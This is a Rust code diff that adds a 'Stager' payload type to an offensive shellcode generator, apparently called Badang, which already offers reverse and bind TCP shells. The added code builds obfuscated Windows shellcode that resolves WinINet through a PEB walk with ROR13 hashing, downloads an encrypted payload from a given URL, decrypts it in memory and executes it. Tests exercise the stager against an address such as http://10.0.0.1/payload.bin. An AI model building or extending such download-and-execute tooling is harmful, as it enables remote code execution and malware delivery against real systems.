@@ -11,6 +11,7 @@ pub enum PayloadType {
     MessageBox,
     ReverseTcp,
     BindTcp,
+    Stager,
 }
 
 impl PayloadType {
@@ -22,6 +23,7 @@ impl PayloadType {
             "messagebox" | "msgbox" | "msg" => Some(Self::MessageBox),
             "reverse_tcp" | "reversetcp" | "reverse" | "rev" => Some(Self::ReverseTcp),
             "bind_tcp" | "bindtcp" | "bind" => Some(Self::BindTcp),
+            "stager" | "stage" | "download" => Some(Self::Stager),
             _ => None,
         }
     }
@@ -33,6 +35,7 @@ impl PayloadType {
             Self::MessageBox => "MessageBox",
             Self::ReverseTcp => "Reverse TCP Shell",
             Self::BindTcp => "Bind TCP Shell",
+            Self::Stager => "Stager (URL Download)",
         }
     }
 
@@ -43,6 +46,7 @@ impl PayloadType {
             Self::MessageBox => "Show a MessageBox popup (harmless PoC)",
             Self::ReverseTcp => "Reverse shell — connect back to IP:PORT, spawn cmd.exe",
             Self::BindTcp => "Bind shell — listen on PORT, spawn cmd.exe on connect",
+            Self::Stager => "Download encrypted payload from URL, decrypt in memory, execute",
         }
     }
 
@@ -53,6 +57,7 @@ impl PayloadType {
             Self::MessageBox,
             Self::ReverseTcp,
             Self::BindTcp,
+            Self::Stager,
         ]
     }
 }
@@ -65,6 +70,8 @@ pub struct PayloadConfig {
     pub text: String,
     pub lhost: String,
     pub lport: u16,
+    pub url: String,
+    pub stager_key: String,
 }
 
 impl Default for PayloadConfig {
@@ -76,6 +83,8 @@ impl Default for PayloadConfig {
             text: String::from("Hello from Badang"),
             lhost: String::from("127.0.0.1"),
             lport: 4444,
+            url: String::new(),
+            stager_key: String::new(),
         }
     }
 }
@@ -88,6 +97,7 @@ pub fn generate(config: &PayloadConfig) -> Result<Vec<u8>, String> {
         PayloadType::MessageBox => generate_messagebox(&config.title, &config.text),
         PayloadType::ReverseTcp => generate_reverse_tcp(&config.lhost, config.lport),
         PayloadType::BindTcp => generate_bind_tcp(config.lport),
+        PayloadType::Stager => generate_stager(&config.url, &config.stager_key),
     }
 }
 
@@ -130,6 +140,28 @@ fn validate_config(config: &PayloadConfig) -> Result<(), String> {
         PayloadType::BindTcp => {
             if config.lport == 0 {
                 return Err("port must be 1-65535".to_string());
+            }
+        }
+        PayloadType::Stager => {
+            if config.url.trim().is_empty() {
+                return Err("URL is empty".to_string());
+            }
+            if config.url.len() > STAGER_URL_SIZE - 1 {
+                return Err(format!(
+                    "URL too long ({} bytes, max {})",
+                    config.url.len(),
+                    STAGER_URL_SIZE - 1
+                ));
+            }
+            if config.stager_key.trim().is_empty() {
+                return Err("stager key is empty".to_string());
+            }
+            if config.stager_key.len() > STAGER_KEY_SIZE - 1 {
+                return Err(format!(
+                    "stager key too long ({} bytes, max {})",
+                    config.stager_key.len(),
+                    STAGER_KEY_SIZE - 1
+                ));
             }
         }
     }
@@ -392,6 +424,53 @@ fn generate_bind_tcp(lport: u16) -> Result<Vec<u8>, String> {
     Ok(sc)
 }
 
+// ============================================================================
+// Stager payload: download encrypted payload from URL, decrypt, execute
+//
+// Data layout (appended after assembled code):
+//   [url, 256 bytes, null-padded]
+//   [key_len, 1 byte]
+//   [key, 31 bytes, null-padded]
+//
+// The template resolves WinINet APIs via PEB walk + ROR13 hashing,
+// downloads from the URL, XOR-decrypts with the baked-in key, and
+// jumps to the decrypted payload in memory.
+// ============================================================================
+const STAGER_URL_SIZE: usize = 256;
+const STAGER_KEY_SIZE: usize = 32;
+
+fn main_stager() -> Vec<u8> {
+    crate::obf::b(&crate::obf::E_MAIN_STAGER)
+}
+
+fn generate_stager(url: &str, key: &str) -> Result<Vec<u8>, String> {
+    let ms = main_stager();
+    let mut sc = assemble(
+        &ms,
+        &[
+            CallPatch { offset: 65, target: CallTarget::FindFunction },
+            CallPatch { offset: 82, target: CallTarget::FindFunction },
+            CallPatch { offset: 90, target: CallTarget::GetDataPtr },
+            CallPatch { offset: 160, target: CallTarget::FindFunction },
+            CallPatch { offset: 183, target: CallTarget::FindFunction },
+            CallPatch { offset: 206, target: CallTarget::FindFunction },
+        ],
+    );
+
+    let mut url_buf = vec![0u8; STAGER_URL_SIZE];
+    let url_bytes = url.as_bytes();
+    url_buf[..url_bytes.len()].copy_from_slice(url_bytes);
+    sc.extend_from_slice(&url_buf);
+
+    let key_bytes = key.as_bytes();
+    sc.push(key_bytes.len() as u8);
+    let mut key_buf = vec![0u8; STAGER_KEY_SIZE - 1];
+    key_buf[..key_bytes.len()].copy_from_slice(key_bytes);
+    sc.extend_from_slice(&key_buf);
+
+    Ok(sc)
+}
+
 // ---------------------------------------------------------------------------
 // Educational info
 // ---------------------------------------------------------------------------
@@ -588,6 +667,8 @@ mod tests {
         for &t in PayloadType::all() {
             let config = PayloadConfig {
                 payload_type: t,
+                url: "http://10.0.0.1/p.bin".to_string(),
+                stager_key: "testkey".to_string(),
                 ..Default::default()
             };
             let result = generate(&config);
@@ -621,6 +702,9 @@ mod tests {
             Some(PayloadType::BindTcp)
         );
         assert_eq!(PayloadType::from_str("bind"), Some(PayloadType::BindTcp));
+        assert_eq!(PayloadType::from_str("stager"), Some(PayloadType::Stager));
+        assert_eq!(PayloadType::from_str("stage"), Some(PayloadType::Stager));
+        assert_eq!(PayloadType::from_str("download"), Some(PayloadType::Stager));
         assert!(PayloadType::from_str("").is_none());
         assert!(PayloadType::from_str("unknown").is_none());
     }
@@ -631,6 +715,7 @@ mod tests {
         assert_eq!(PayloadType::MessageBox.name(), "MessageBox");
         assert_eq!(PayloadType::ReverseTcp.name(), "Reverse TCP Shell");
         assert_eq!(PayloadType::BindTcp.name(), "Bind TCP Shell");
+        assert_eq!(PayloadType::Stager.name(), "Stager (URL Download)");
     }
 
     #[test]
@@ -687,5 +772,59 @@ mod tests {
     #[test]
     fn test_sub_get_data_ptr_size() {
         assert_eq!(sub_get_data_ptr().len(), 11);
+    }
+
+    #[test]
+    fn test_generate_stager_contains_url() {
+        let config = PayloadConfig {
+            payload_type: PayloadType::Stager,
+            url: "http://10.0.0.1/payload.bin".to_string(),
+            stager_key: "secret".to_string(),
+            ..Default::default()
+        };
+        let bytes = generate(&config).unwrap();
+        assert!(bytes.windows(11).any(|w| w == b"10.0.0.1/pa"));
+    }
+
+    #[test]
+    fn test_generate_stager_contains_key() {
+        let config = PayloadConfig {
+            payload_type: PayloadType::Stager,
+            url: "http://10.0.0.1/p.bin".to_string(),
+            stager_key: "mykey123".to_string(),
+            ..Default::default()
+        };
+        let bytes = generate(&config).unwrap();
+        assert!(bytes.windows(8).any(|w| w == b"mykey123"));
+    }
+
+    #[test]
+    fn test_generate_stager_validation() {
+        let empty_url = PayloadConfig {
+            payload_type: PayloadType::Stager,
+            url: String::new(),
+            stager_key: "key".to_string(),
+            ..Default::default()
+        };
+        assert!(generate(&empty_url).is_err());
+
+        let empty_key = PayloadConfig {
+            payload_type: PayloadType::Stager,
+            url: "http://10.0.0.1/p".to_string(),
+            stager_key: String::new(),
+            ..Default::default()
+        };
+        assert!(generate(&empty_key).is_err());
+    }
+
+    #[test]
+    fn test_stager_template_size() {
+        assert_eq!(main_stager().len(), 401);
+    }
+
+    #[test]
+    fn test_stager_starts_with_cld() {
+        let bytes = main_stager();
+        assert_eq!(bytes[0], 0xFC, "stager template should start with CLD");
     }
 }
